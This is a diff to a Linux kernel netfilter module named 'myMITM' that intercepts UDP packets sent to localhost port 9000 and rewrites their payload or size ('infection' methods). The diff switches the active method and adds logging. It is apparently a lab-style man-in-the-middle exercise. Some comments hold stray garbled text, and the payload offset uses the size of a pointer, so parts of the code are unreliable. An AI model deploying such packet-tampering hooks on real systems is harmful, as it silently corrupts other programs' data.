@@ -19,7 +19,7 @@ MODULE_LICENSE("Dual BSD/GPL");
 static dev_t my_dev = 0;
 static struct cdev *my_cdev = NULL;
 static struct nf_hook_ops nfho;
-static const int infectionMethod=0;        //struct holding set of hook function options
+static const int infectionMethod=1;        //struct holding set of hook function options
 //function to be called by hook
 
 
@@ -46,14 +46,15 @@ unsigned short compute_udp_checksum(struct iphdr *pIph, unsigned short *ipPayloa
     register unsigned long sum = 0;
     struct udphdr *udphdrp = (struct udphdr*)(ipPayload);
     unsigned short udpLen = htons(udphdrp->len);
+    //add sorce ip
     sum += (pIph->saddr>>16)&0xFFFF;
     sum += (pIph->saddr)&0xFFFF;
-    //the dest ip
+    //add dest ip
     sum += (pIph->daddr>>16)&0xFFFF;
     sum += (pIph->daddr)&0xFFFF;
-    //protocol and reserved: 17
+    // add protocol and reserved: 17
     sum += htons(IPPROTO_UDP);
-    //the length
+    //add length
     sum += udphdrp->len;
 
     //add the IP payload
@@ -106,15 +107,14 @@ void infectionByData(struct sk_buff *skb,struct udphdr *udph,struct iphdr *iph, 
     printk("myMITM udph->dest = %d\n",udph->dest);
     printk("myMITM iph->saddr = %x\n",iph->saddr);
     payload=skb->data+(iph->ihl * 4)+sizeof(udph);
-    printk("payload is %d",ntohl(*(((int*)payload)+1)));
+    printk("payload is %d",ntohl(*(((int*)payload)+2)));
 
     //------change UDP data,using htonl function to add bigEndian number---------------//
     //------because the packet sent from java application and java is bigEndian-------//
     *(((int*)payload)+2)+=htonl(DATA_INFECTION);
 
-    printk("myMITM change payload\n");
-    printk("payload is %d",ntohl(*(((int*)payload)+1)));
-
+    printk( KERN_ALERT "myMITM change payload\n");
+    printk("payload is %d",ntohl(*(((int*)payload)+2)));
 }
 
 
@@ -135,7 +135,7 @@ void infectionByData(struct sk_buff *skb,struct udphdr *udph,struct iphdr *iph, 
  *!
  *! ASSUMPTIONS:		none.
  *! REMARKS:			none.
- *!
+ *!infectionMethod
  *!*****************************************************************************
  *!@*/
 void infectionBySize(struct sk_buff *skb,struct udphdr *udp_hdr,struct iphdr *ip_hdr)
@@ -162,7 +162,7 @@ void infectionBySize(struct sk_buff *skb,struct udphdr *udp_hdr,struct iphdr *ip
  *! Input:				constant prototype(I'm using only the socket buffer-skb)
  *!
  *! ALGORITHM:			The algorithm is base on the following operations:
- *!                     1.extract ethdr, iphdr and udphdr
+ *!                     1.extractinfectionMethod ethdr, iphdr and udphdr
  *!                     2.check if the packet id the packet to infect by port and ip
  *!                     3.choose infection method and infect the packet
  *!
@@ -191,6 +191,8 @@ unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_sta
             if(iph->daddr==in_aton("127.0.0.1"))
             {
                 udph=(struct udphdr*)skb_transport_header(skb);
+                printk("iphr->tot_len= %d", htons(iph->tot_len));
+                printk("udph->len= %d",htons(udph->len));
                 if(udph->dest==htons(9000))
                 {
                     switch(infectionMethod)
